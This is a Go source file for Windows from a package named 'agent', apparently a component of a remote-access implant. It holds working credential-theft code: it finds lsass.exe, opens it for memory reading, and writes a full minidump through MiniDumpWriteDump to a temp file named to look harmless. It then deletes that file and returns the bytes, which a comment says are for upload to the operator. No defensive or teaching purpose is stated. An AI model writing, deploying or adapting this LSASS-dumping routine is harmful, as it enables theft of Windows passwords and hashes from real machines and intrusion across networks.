//go:build windows

package agent

import (
	"fmt"
	"os"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	dbghelp               = windows.NewLazySystemDLL("dbghelp.dll")
	procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")

	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
)

const miniDumpWithFullMemory uint32 = 0x00000002

// PROCESSENTRY32W matches the Windows structure layout (unicode).
type processEntry32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

// findProcessPID returns the PID of the first process whose name matches (case-insensitive).
func findProcessPID(name string) uint32 {
	const TH32CS_SNAPPROCESS = 0x00000002
	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snap == uintptr(windows.InvalidHandle) {
		return 0
	}
	defer windows.CloseHandle(windows.Handle(snap))

	var entry processEntry32
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	r, _, _ := procProcess32First.Call(snap, uintptr(unsafe.Pointer(&entry)))
	for r != 0 {
		exe := windows.UTF16ToString(entry.szExeFile[:])
		if strings.EqualFold(exe, name) {
			return entry.th32ProcessID
		}
		entry.dwSize = uint32(unsafe.Sizeof(entry))
		r, _, _ = procProcess32Next.Call(snap, uintptr(unsafe.Pointer(&entry)))
	}
	return 0
}

// lsassDump opens lsass.exe (or pid if non-zero), writes a full minidump to a
// temp file, reads it back, and removes the temp file. Returns raw dump bytes
// for upload via t.uploadFile.
func lsassDump(pid uint32) ([]byte, error) {
	if pid == 0 {
		pid = findProcessPID("lsass.exe")
		if pid == 0 {
			return nil, fmt.Errorf("lsass.exe not found")
		}
	}

	handle, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
		false,
		pid,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(handle)

	tmp, err := os.CreateTemp("", "ms*.dat")
	if err != nil {
		return nil, fmt.Errorf("CreateTemp: %w", err)
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath)

	r, _, e := procMiniDumpWriteDump.Call(
		uintptr(handle),
		uintptr(pid),
		uintptr(tmp.Fd()),
		uintptr(miniDumpWithFullMemory),
		0, 0, 0,
	)
	tmp.Close()
	if r == 0 {
		return nil, fmt.Errorf("MiniDumpWriteDump: %v", e)
	}

	return os.ReadFile(tmpPath)
}
